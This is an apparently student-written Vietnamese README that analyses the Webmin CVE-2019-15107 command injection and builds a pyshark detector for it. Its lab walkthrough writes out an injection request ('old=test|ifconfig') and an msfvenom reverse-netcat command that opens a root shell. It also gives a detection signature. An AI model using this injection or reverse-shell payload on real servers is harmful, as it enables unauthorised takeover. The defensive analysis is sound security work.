# detect-CVE-2019-15107-by-pyshark

I.	Tổng quan về CVE-2019-15107
Webmin là một giao diện dựa trên web để quản trị hệ thống cho Unix. Sử dụng bất kỳ trình duyệt web nào, ta có thể thiết lập tài khoản người dùng, Apache, DNS, chia sẻ tệp và hơn thế nữa.
Ngày 10/8/2019 nhà nghiên cứu an ninh mạng người Thổ Nhĩ Kỳ Özkan Mustafa Akkuş đã công bố lỗ hổng Zero-day tại DefCon ngoài việc công bố lỗ hổng Akkuş cũng phát hành một modulo Metasploit nhằm tự động hóa việc khai thác lỗ hổng này. Do lỗ hổng thực thi mã trong chức năng đặt lại mật khẩu của tệp password_change.cgi, lỗ hổng này cho phép bên thứ ba thực thi mã độc mà không cần xác thực đầu vào. 
II.	Phiên bản ảnh hưởng
Lỗ hổng này ảnh hưởng tới các phiên bản của Webmin từ 1.882 đến 1.921. Để ngăn ngừa lỗ hổng này, các bạn đang sử dụng Webmin nên cập nhật lên phiên bản Webmin mới nhất 1.93
III.	Phân tích lỗ hổng
Trong webmin, tính năng "cho phép thay đổi mật khẩu người dùng" cần phải được bật để khai thác lỗ hổng này. Đây là điều kiện duy nhất, tuy nhiên, nhiều người quản lý webmin kích hoạt tính năng này. Chúng cho phép người dùng đặt mật khẩu mới với mật khẩu cũ. Trong mã nguồn ứng dụng Webmin, có một số tệp ".cgi" đáng chú ý. Một trong số đó là password_change.cgi.
![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/0910176f-125a-4a96-8922-21a23d13e1b2)

 
Chỉ có một yêu cầu để các tham số trong tệp này hoạt động, đó là giá trị "passwd_mode" trong tệp cấu hình "miniserv.conf" được đặt thành "2".

![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/7b250b05-ebc0-4e93-bce2-1b6dde23eba8)

 
Tại thời điểm này, chúng tôi sẽ sử dụng "|" bằng cách đọc tệp /etc/shadow trong quá trình xác thực mật khẩu cũ. Ví dụ câu lệnh change password bình thường:
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/5548ea5d-af9d-4b20-99be-9a180e36b0ab)

Nếu ta chèn thêm 1 lệnh đơn giản như “ifconfig” vào câu lệnh change password như hình dưới thì lệnh “ipconfig” đã được thực thi và kết quả được hiển thị.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/157cd8bb-c850-4466-954b-d3e1dbb666b1)

IV.	Mô hình triển khai
-	Máy Ubuntu (victim) cài đặt webmin phiên bản 1.920 có địa chỉ IP: 192.168.109.128
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/8f16dbaf-8b90-4441-8f59-58c8f0d63c4b)

-	Máy Kali (attacker) có địa chỉ IP: 192.168.109.131
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/e5f97eb9-a3b7-4e76-bf28-f85f1e3cbb4f)

 
-	Do CVE này thực thi dựa trên chức năng đặt lại mật khẩu khi mật khẩu cũ đã hết hạn của webmin nên victim phải cài đặt webmin ở chế độ đó là “Prompt users with expired password to enter a new one”.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/5b4d8144-cf34-4d97-a187-984f638a08a9)


V.	Khai thác lỗ hổng CVE
-	Bước đầu, máy attacker sẽ sử dụng Burp Suite để bắt những request gửi lên khi đổi mật khẩu trên webmin từ đường link: 192.168.109.128:10000/password_change.cgi (ip của vitctim)
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/dc0c2c15-1da7-470a-8364-039114c686cf)

 
-	Sau đó máy attacker gửi request này qua tab Repeater của Burp Suite để thử lỗi.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/8d35dd08-aa05-40a4-8c3f-6289c836f2d1)

-	Attacker tiến hành chỉnh sửa một số thông tin từ gói request bắt được. Vì để thay đổi password thì HTTP Method phải là POST chứ không phải GET như ban đầu.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/d63c5fb8-8fc4-4340-a03b-0cbf2d221bb5)

 
-	Sau đó máy attacker sẽ gửi thử một request thay đổi password từ password cũ lên server webmin của victim:
“user=test&pam=&old=test&new1=test2&new2=test2”
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/f47315cc-1a18-47db-bd9e-e2a44801fecd)

-	Khi gửi request, ta sẽ nhận được thông báo là mật khẩu cũ không khớp (The current password is incorrect) nên cốt lõi sẽ là ở tham số “old”
-	Tiếp đến ta thử chèn một lệnh cơ bản như ifconfig vào sau tham số old để khi server check password cũ thì sẽ thực thi luôn câu lệnh ta chèn vào. Ví dụ như:
“user=test&pam=&old=test|ifconfig&new1=test2&new2=test2”
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/b03b613f-e744-4467-99f4-fa35b43b5f63)

-	Tương tự như trên, khi server kiểm tra password cũ thì vẫn là sai nhưng sau khi kiểm tra password đó thì lệnh “ifconfig” đã được thực thi và hiển thị.
-	Sau đó, để có thể chiếm quyền root ta sẽ dùng Metasploit framework để tạo một payload gửi lên server webmin của victim để nhận shell session.
“msfvenom -p cmd/unix/reverse_netcat lhost=<attacker ip> lport=<attacker port>”
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/32686a62-9dd1-419a-90e1-96d9b71c23e7)

-	Tiếp đến, ta copy payload và chèn vào request trên Burp Suite.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/a6fba52b-9387-46c3-a3be-97cac9146495)

 
-	Sau khi gửi request có chứa payload lên webmin server thì máy victim đã bị dính reverse shell. Máy attacker nhận được một shell session đến máy nạn nhân (ip: 192.168.109.128 port 37218).
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/3ad53665-f45b-4d6a-a71e-9a722ee5d0a4)

-	Như vậy, ta đã chiếm được root thông qua lỗ hổng CVE này.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/f7fc02af-4b43-4343-9613-600b3783b47e)

 
VI.	Xác định signature của cuộc tấn công
-	Sử dụng Wireshark để bắt các gói tin trong lớp mạng.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/8a8b16c6-9697-4ebc-9245-8acd32ebebb4)

-	Vì để khai khác CVE này, attacker sẽ phải dựa vào đường link /password_change.cgi để gửi những request có chứa payload độc hại qua Method POST của HTTP nên ta sẽ phải phân tích các gói tin HTTP bắt được trên Wireshark.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/9da69965-f023-45d6-92a2-93de47619ae2)

-	Ta thấy được lệnh “ifconfig” được chèn vào trong quá trình webmin server kiểm tra password cũ muốn thay đổi.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/93daf39f-4b71-409c-8146-862256d3878e)
![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/7d6ab4a9-013b-47d6-86fd-4a7c9509f457)

 
 
-	Vì vậy, ta xác định được signature của CVE này là những tham số truyền vào trong quá trình thay đổi password qua đường link /password_change.cgi
“user=test&pam=&old=test | <lệnh attacker muốn thực thi> &new1=test2&new2=test2”
VII.	Xây dựng công cụ phát hiện tấn công CVE-2019-15107
-	Như đã phân tích bên trên, attacker muốn khai thác CVE này phải chèn command vào tham số old (“mật khẩu cũ”) để có thể thực hiện tấn công.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/c041ed80-af2c-4926-85c4-f3870e7b0597)

-	Để có thể phát hiện được những ai đang cố gắng chèn lệnh dựa trên lỗ hổng CVE này, ta sẽ phải bắt và phân tích các gói tin HTTP mà họ gửi lên bằng công cụ “pyshark”.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/4f6168f0-2e2d-419b-ad35-dfbe3e02fffd)

 
-	Data trong gói HTTP bắt được sẽ trả về dưới dạng Hex. Dựa vào tham số “old=” và “|” ta có thể biết được có ai đó đang cố gắng thực hiện khai thác CVE này. Hàm checkPayload để kiểm tra gói HTTP có vấn đề hay không.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/e084a86a-71bb-4763-9928-7a9faeedb953)

-	Tiếp đó, sau khi xác định được gói HTTP nào có vấn đề thì hàm getCommand sẽ in ra những command mà attacker đang thực hiện.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/890185b3-b056-479e-a6d4-5c308ffe89ca)

-	Quá trình bắt và phân tích gói cũng được ghi lại dưới dạng .csv
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/faf8cb5e-bb4a-4f7c-b18f-54d74f1c006b)

VIII.	Demo chương trình
-	Khi attacker thực hiện tấn công chương trình sẽ cảnh báo realtime.
  ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/3b0e6abf-3a50-4d2d-9bc6-af21b8e47b03)

-	Khi dừng chương trình thì sẽ ghi lại 1 file .csv các traffic bắt được trong quá trình chạy chương trình (payload http dưới dạng hex)
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/c39cfb69-5c8e-4b16-b700-3a9aa9262add)

-	Chương trình cũng ghi lại log các cảnh báo nguy hiểm.
 ![image](https://github.com/gozn/detect-CVE-2019-15107-by-pyshark/assets/24872162/260baf93-be52-4117-96b1-5cfeb3f87892)

 
IX.	Kết luận
Qua quá trình học tập và làm các bài thực hành trên lớp em có thể hiểu phần nào về quá trình tìm hiểu và phân tích mã độc. Khi thực hiện việc khai thác và xây dựng chương trình phát hiện lỗ hổng CVE-2019-15107 em đã có thể áp dụng những kiến thức đã học vào việc phân tích và xây dựng chương trình phát hiện lổ hổng qua các signature nhờ đó nâng cao khả năng phân tích, phát hiện và xử lý các thông tin cũng như việc giám sát an ninh mạng.

